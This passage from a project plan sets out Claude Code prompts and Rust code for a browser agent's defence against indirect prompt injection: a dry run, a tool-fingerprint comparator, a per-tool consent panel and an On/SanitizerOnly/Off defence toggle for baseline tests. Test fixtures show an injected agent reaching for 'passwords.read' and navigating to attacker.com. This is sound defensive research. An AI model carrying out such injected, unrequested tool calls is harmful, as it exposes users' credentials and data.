        let task = AgentTask::new("read my emails", None);
        let record = orch.run(&task, &[], &AlwaysNavigateAgent).await.unwrap();
        assert!(record.completed);
    }
}
```
Exit condition: `cargo test -p ferrite-ipi -- dry_run` — both dry run tests pass. Navigation to attacker.com is recorded. The real browser is never touched.

## Task 17: IPI — Fingerprint Comparator + Consent UI (`ferrite-ipi::comparator`)
### Block 1: `FingerprintDiff`, `compare()`, `ConsentDecision`, and `IpiEvent`
What it does: Compares the expected `ToolFingerprint` (from Task 12) against the actual `DryRunRecord` (from Task 16). Produces a `FingerprintDiff` identifying every extra tool and suspicious origin the agent used beyond what the prompt implied. Defines `ConsentDecision` — the user's per-tool approval/rejection state. Defines `IpiEvent` for the dataset pipeline.

Prompt for Claude Code:
```
In crates/ferrite-ipi/src/comparator/mod.rs implement:

use std::collections::HashSet;
use crate::tool_decision::{ToolId, ToolFingerprint};
use crate::dry_run::DryRunRecord;

#[derive(Debug, Default, Clone)]
pub struct FingerprintDiff {
    /// Tools the agent called that were not in must-use or may-use.
    pub extra_tools: HashSet<ToolId>,
    /// Origins the agent contacted that were not implied by the task.
    pub extra_origins: HashSet<String>,
}

impl FingerprintDiff {
    pub fn is_clean(&self) -> bool {
        self.extra_tools.is_empty() && self.extra_origins.is_empty()
    }

    pub fn summary(&self) -> String {
        if self.is_clean() {
            return "No unexpected activity detected.".to_string();
        }
        let mut lines = vec![
            "The agent attempted the following actions beyond your request:".to_string()
        ];
        for tool in &self.extra_tools {
            lines.push(format!("  - Used tool: {}", tool));
        }
        for origin in &self.extra_origins {
            lines.push(format!("  - Contacted: {}", origin));
        }
        lines.join("\n")
    }
}

pub fn compare(expected: &ToolFingerprint, actual: &DryRunRecord) -> FingerprintDiff {
    let extra_tools = actual.tools_called
        .iter()
        .filter(|tool| !expected.contains(tool))
        .cloned()
        .collect();

    // Flag external origins only when network.fetch is not in the expected set.
    let extra_origins = if expected.contains(&ToolId::new("network.fetch")) {
        HashSet::new()
    } else {
        actual.origins_touched.clone()
    };

    FingerprintDiff { extra_tools, extra_origins }
}

#[derive(Debug, Default, Clone)]
pub struct ConsentDecision {
    pub approved: HashSet<ToolId>,
    pub rejected: HashSet<ToolId>,
}

impl ConsentDecision {
    pub fn is_complete(&self, diff: &FingerprintDiff) -> bool {
        diff.extra_tools.iter().all(|t| {
            self.approved.contains(t) || self.rejected.contains(t)
        })
    }
    pub fn approve(&mut self, tool: ToolId) {
        self.rejected.remove(&tool);
        self.approved.insert(tool);
    }
    pub fn reject(&mut self, tool: ToolId) {
        self.approved.remove(&tool);
        self.rejected.insert(tool);
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct IpiEvent {
    pub event_id: uuid::Uuid,
    pub detected_at: chrono::DateTime<chrono::Utc>,
    pub origin: String,
    pub payload_hash: String,
    pub extra_tools: Vec<String>,
    pub task_context_hash: String,
    pub label: IpiLabel,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq)]
pub enum IpiLabel { TruePositive, FalsePositive }

#[cfg(test)]
mod tests {
    use super::*;
    use uuid::Uuid;

    fn make_fp(must: &[&str], may: &[&str]) -> ToolFingerprint {
        ToolFingerprint {
            session_id: Uuid::new_v4(), task_id: Uuid::new_v4(),
            must_use: must.iter().map(|s| ToolId::new(s)).collect(),
            may_use:  may.iter().map(|s| ToolId::new(s)).collect(),
        }
    }

    fn make_record(tools: &[&str]) -> DryRunRecord {
        let mut r = DryRunRecord::new(Uuid::new_v4(), Uuid::new_v4());
        for t in tools { r.record_tool(ToolId::new(t)); }
        r
    }

    #[test]
    fn clean_when_agent_uses_expected_tools_only() {
        let fp = make_fp(&["email.read"], &["report.write"]);
        let record = make_record(&["email.read", "report.write"]);
        assert!(compare(&fp, &record).is_clean());
    }

    #[test]
    fn detects_extra_tool() {
        let fp = make_fp(&["email.read"], &[]);
        let record = make_record(&["email.read", "passwords.read"]);
        let diff = compare(&fp, &record);
        assert!(!diff.is_clean());
        assert!(diff.extra_tools.contains(&ToolId::new("passwords.read")));
    }

    #[test]
    fn may_use_tools_are_not_flagged() {
        let fp = make_fp(&["email.read"], &["email.send"]);
        let record = make_record(&["email.read", "email.send"]);
        assert!(compare(&fp, &record).is_clean());
    }

    #[test]
    fn summary_describes_extras_clearly() {
        let fp = make_fp(&["email.read"], &[]);
        let record = make_record(&["email.read", "passwords.read"]);
        let diff = compare(&fp, &record);
        assert!(diff.summary().contains("passwords.read"));
    }

    #[test]
    fn consent_is_complete_when_all_decided() {
        let mut diff = FingerprintDiff::default();
        diff.extra_tools.insert(ToolId::new("passwords.read"));
        diff.extra_tools.insert(ToolId::new("network.fetch"));
        let mut decision = ConsentDecision::default();
        assert!(!decision.is_complete(&diff));
        decision.approve(ToolId::new("passwords.read"));
        assert!(!decision.is_complete(&diff));
        decision.reject(ToolId::new("network.fetch"));
        assert!(decision.is_complete(&diff));
    }

    #[test]
    fn approve_removes_from_rejected() {
        let mut decision = ConsentDecision::default();
        decision.reject(ToolId::new("email.send"));
        decision.approve(ToolId::new("email.send"));
        assert!(decision.approved.contains(&ToolId::new("email.send")));
        assert!(!decision.rejected.contains(&ToolId::new("email.send")));
    }
}
```
Add to crates/ferrite-ipi/Cargo.toml: chrono = { version = "0.4", features = ["serde"] }
Exit condition: `cargo test -p ferrite-ipi` — all six comparator tests pass.

### Block 2: Consent UI panel in Iced agent sidebar
What it does: When the dry run detects extra tools, the agent sidebar replaces its normal state with a consent dialog. Each extra tool gets an Approve/Reject button. The agent proceeds only after the user decides on every item. Rejected tools are blocked during the real run by wrapping the `BrowserToolExecutor` in a filter.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs:

1. Add to crates/ferrite-ui/Cargo.toml:
   ferrite-ipi = { path = "../ferrite-ipi" }

2. Add to FerriteBrowser state:
   - pending_diff: Option<ferrite_ipi::comparator::FingerprintDiff>
   - pending_decision: ferrite_ipi::comparator::ConsentDecision (default)
   - approved_extras: std::collections::HashSet<ferrite_ipi::tool_decision::ToolId>

3. Add to FerriteBrowserMessage:
   - ConsentRequired(ferrite_ipi::comparator::FingerprintDiff)
   - ApproveTool(String)
   - RejectTool(String)
   - ConsentSubmitted
   - ConsentCancelled

4. Add to update():
   - ConsentRequired(diff):
     pending_diff = Some(diff); pending_decision = Default::default();
     agent_is_running = false.
   - ApproveTool(id):
     pending_decision.approve(ferrite_ipi::tool_decision::ToolId::new(&id)).
   - RejectTool(id):
     pending_decision.reject(ferrite_ipi::tool_decision::ToolId::new(&id)).
   - ConsentSubmitted:
     approved_extras = pending_decision.approved.clone().
     Clear pending_diff and pending_decision.
     Resume agent real run (spawn task, same as AgentTaskSubmitted but now
     BrowserToolExecutor is wrapped: if executor is asked to call a rejected
     tool, return AgentToolResult::err(call.call_id, "blocked by user consent")).
   - ConsentCancelled:
     Clear pending_diff and pending_decision.
     agent_is_running = false.

5. Modify AgentTaskSubmitted to run the IPI dry run FIRST:
   Before spawning the real agent task:
   a. Create ToolDecisionEngine::new() and call fingerprint_from_task(&task).
   b. Create DryRunOrchestrator::new(twin_path) and call run(&task, &[], &agent).
   c. Call compare(&fingerprint, &dry_run_record).
   d. If diff.is_clean(): proceed to real agent run immediately.
   e. If not clean: send ConsentRequired(diff) and return — wait for user.
   The dry run must run asynchronously (in the same tokio task) before the
   real run starts. Send AgentToolLogged("[dry run complete — checking for
   unexpected activity]") while it runs.

6. In view(), inside the agent sidebar:
   When pending_diff is Some, render the consent panel INSTEAD of the
   tool log and response box:

   Amber-tinted container (use palette.danger.base.color with 0.08 alpha background):

   Row: Text "! Unexpected Activity Detected" (size 14, bold, danger colour).

   Text(diff.summary()) (size 12, wrapped, secondary colour).

   Separator.

   Text "Review each item:" (size 12, bold).

   For each tool in diff.extra_tools (sorted alphabetically):
     Row:
       Text(tool_id.to_string()) (size 12, fills width)
       [Approve] button -> ApproveTool(tool_id.to_string())    green tint
       [Reject]  button -> RejectTool(tool_id.to_string())     red tint
       Visual: button highlighted if already decided.

   Separator.

   [Proceed with approved] button -> ConsentSubmitted.
     Disabled until pending_decision.is_complete(&diff).

   [Cancel] button -> ConsentCancelled.
```
Exit condition: `cargo run -p ferrite-shell ui`. With `FERRITE_GEMINI_API_KEY` set, submit a task. Dry run executes silently. If clean, real run starts immediately. If not, the consent panel appears with Approve/Reject per extra tool. After all decisions, "Proceed" starts the real run; rejected tools are blocked and logged. "Cancel" returns to idle state.

## Task 18: IPI — Defense Mode Toggle (baseline control)
### Block 1: Three-mode toggle (On / SanitizerOnly / Off)  |  ⏳ To Do
What it does: Adds a single, clean switch with three modes that control how much of the IPI defense runs, so the agent can be run in distinct baseline conditions required by EVALUATION_PLAN.md §4. `On` runs the full predict→dry-run→compare→consent loop (unchanged default). `Off` bypasses everything — no sanitizer, no synthetic-data twin, no dry-run, no comparator, no consent — measuring genuinely undefended behaviour (M2). `SanitizerOnly` runs the content sanitizer but bypasses the dry-run/compare/consent loop, isolating how much containment comes from passive content-stripping versus the full architectural loop. Every mode is a single decision point; partial/scattered defense states are not allowed.

Prompt for Claude Code:
```
Goal: add a three-mode defense toggle to the IPI loop for baseline evaluation runs.
Modes: On (full loop), SanitizerOnly (sanitizer runs, loop bypassed), Off (nothing runs).

STEP 1 — Locate the integration point (do not assume; inspect).
Find where the agent task currently enters the IPI loop. Search ferrite-ui/src/lib.rs
and ferrite-ipi/src/ for the call site that runs the sanitizer, then the dry-run /
RecordingExecutor and comparator, before the real agent run (the handler that today
fires the consent flow on a submitted agent task). Identify the exact function/handler,
the type that owns the loop entry, and the precise point where the sanitizer runs
relative to the dry-run. Report what you found before editing if anything is ambiguous.

STEP 2 — Define the mode enum.
In ferrite-ipi, add:

    #[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
    pub enum DefenseMode {
        #[default]
        On,            // full predict→dry-run→compare→consent loop
        SanitizerOnly, // sanitizer runs; dry-run/compare/consent bypassed
        Off,           // baseline: agent runs directly, no IPI machinery at all
    }

Expose it on the struct that owns the loop entry (found in STEP 1) as a field
`defense_mode: DefenseMode`, defaulting to On. Do NOT change default behaviour — On
must remain the default everywhere.

STEP 3 — Branch at the single entry point.
At the loop entry, branch on defense_mode:
- On            -> existing behaviour, unchanged (sanitizer + dry-run + compare + consent).
- SanitizerOnly -> run the sanitizer exactly as in On, then skip the synthetic-data twin,
                   dry-run/RecordingExecutor, fingerprint comparison, and consent gate;
                   hand the (sanitized) task straight to the real agent run path.
- Off           -> skip the sanitizer too; hand the task straight to the real agent run
                   path, touching NONE of the IPI components.
Keep this as one decision point near the single entry, not scattered conditionals. The
only difference between SanitizerOnly and Off is whether the sanitizer stage executes.

STEP 4 — Make it switchable two ways.
(a) Programmatic: a setter `set_defense_mode(&mut self, mode: DefenseMode)` on the owning
    type, for the future eval harness to drive.
(b) Environment override read once at startup, in the same place the engine/controller is
    constructed (do not scatter env reads). Read FERRITE_DEFENSE (case-insensitive):
      "off"            -> DefenseMode::Off
      "sanitizer_only" -> DefenseMode::SanitizerOnly
      "on" / unset / anything else -> DefenseMode::On
    This lets a CI release build select a baseline condition without code changes.

STEP 5 — Tests (ferrite-ipi).
Add unit tests asserting:
- DefenseMode::default() == DefenseMode::On.
- Off takes the full-bypass path: no sanitizer effect, no dry-run record, no comparator
  diff produced (assert via existing observable outputs of the recorder/comparator; do
  not add test-only side channels if an existing observable exists).
- SanitizerOnly runs the sanitizer (assert a sanitizer-observable effect on known-dirty
  input) but produces no dry-run record / comparator diff.
- set_defense_mode flips the mode and the subsequent run respects it.
If the bypass is not directly observable in a unit test, add the smallest honest
observable (e.g. the entry returns an enum distinguishing RanFullLoop / RanSanitizerOnly
/ Bypassed) rather than a bool only the test reads.

CONSTRAINTS:
- Do not add or modify any dependency. No Cargo.toml edits.
- Do not alter the On path's behaviour in any way.
- Verification is via GitHub Actions (Windows + macOS); ensure `cargo test -p ferrite-ipi`
  and `cargo build` are clean. No Linux-only code.
```
Exit condition: `cargo test -p ferrite-ipi` passes including the new mode tests. Launching with `FERRITE_DEFENSE=off` runs a submitted task directly (no consent panel, no dry-run, no sanitizer); `FERRITE_DEFENSE=sanitizer_only` runs the sanitizer but still shows no consent panel and no dry-run; a normal launch (unset or `on`) shows the unchanged full-loop behaviour. `set_defense_mode` flips the mode at runtime.

---

## Task 19: IPI — Dataset Pipeline (`ferrite-ipi::dataset`)  |  ⏳ To Do — SCHEMA BLOCKED

> **DO NOT IMPLEMENT YET.** The schema must be revised against EVALUATION_PLAN.md §7
> before this task is decomposed into a final prompt. The §7 field list (delivery
> surface T1a/T1b, attack category, carrier, expected fingerprint, actual tools/origins,
> computed diff, outcome label, defense mode On/SanitizerOnly/Off, timing for M4,
> audit-log link) is broader than any earlier draft. Per EVALUATION_PLAN.md §11 steps
> 2–3, the schema is pinned only after §10 items 1–3 (corpus sizes, category list,
> AgentDojo scope) are settled. Implementing a simpler embedded schema now means
> re-running experiments later.

What it will do: Implements component 7 — the labelled dataset pipeline that records every
evaluation event (attack and benign, across all defense modes) to the §7 schema, exports it
as the browser-native IPI corpus artifact, and is the instrument that produces the M1–M6
numbers.

Prompt for Claude Code: *(to be written against EVALUATION_PLAN.md §7 once the schema is
finalized — see EVALUATION_PLAN.md §11.)*

Exit condition: *(to be defined with the finalized schema.)*

---

## Task 20: IPI — Sanitizer T1b Extension (`ferrite-ipi::sanitizer`)  |  ⏳ To Do — SCHEMA COUPLED

> Coupled to Task 19. Implement alongside the revised dataset schema — both concern what
> is captured about a tool-output injection (EVALUATION_PLAN.md §7 open implementation
> note). Do not decompose until Task 19's schema is finalized.

What it will do: Extends the existing HTML/JS sanitizer (component 2) to scan and strip
injection patterns in **tool-output text/JSON**, not just rendered HTML/JS — covering the
T1b delivery surface (EVALUATION_PLAN.md §2.1, §8 item 2). Defense-in-depth: containment
already holds via the loop, but this exercises the sanitizer on the second surface and is
the stage gated by `DefenseMode::SanitizerOnly`.

Prompt for Claude Code: *(to be written alongside Task 19.)*

Exit condition: *(to be defined.)*

---

## Task 21: Evaluation Harness  |  ⏳ To Do — DEPENDS ON 18, 19, 20

> Depends on the toggle (18), dataset pipeline (19), and T1b sanitizer (20) all existing.
> The runner executes each corpus case across defense modes and emits dataset records
> (EVALUATION_PLAN.md §8.4). Decompose after 18–20 are done and §10 item 6 (harness home —
> ferrite-shell subcommand vs. dedicated eval binary) is decided.

What it will do: Takes a corpus, runs each case in the required defense modes via the
toggle, captures records through the dataset pipeline, and produces the R1–R10 run outputs
(EVALUATION_PLAN.md §9).

Prompt for Claude Code: *(to be written after 18–20.)*

Exit condition: *(to be defined.)*

---

## Task 22: AgentDojo Adapter (timeboxed validation slice)  |  ⏳ To Do — DEPENDS ON 21

> Depends on the harness (21). Maps a small subset of AgentDojo cases onto Ferrite's tool
> surface for the §6.1 external-benchmark independence slice. **Timeboxed** — a validation
> slice, not a full benchmark port (avoid scope-creep into Option A). Decompose after §10
> item 3 (AgentDojo slice scope) is settled.

What it will do: Provides the externally-authored independence layer (EVALUATION_PLAN.md
§6.1 layer 3) that the credibility floor guarantees, run once after the defense is frozen.

Prompt for Claude Code: *(to be written after Task 21.)*

Exit condition: *(to be defined.)*

---

## Process deliverables (not code tasks)

- **Corpus construction** — the two browser-native corpora (attack + benign) per
  EVALUATION_PLAN.md §3. Authored, not coded. Blocked on §10 items 1–2.
- **Independent-author briefs** — teammate + external-professor briefing packages per
  EVALUATION_PLAN.md §6.3. Written at corpus stage; must reference the finalized schema.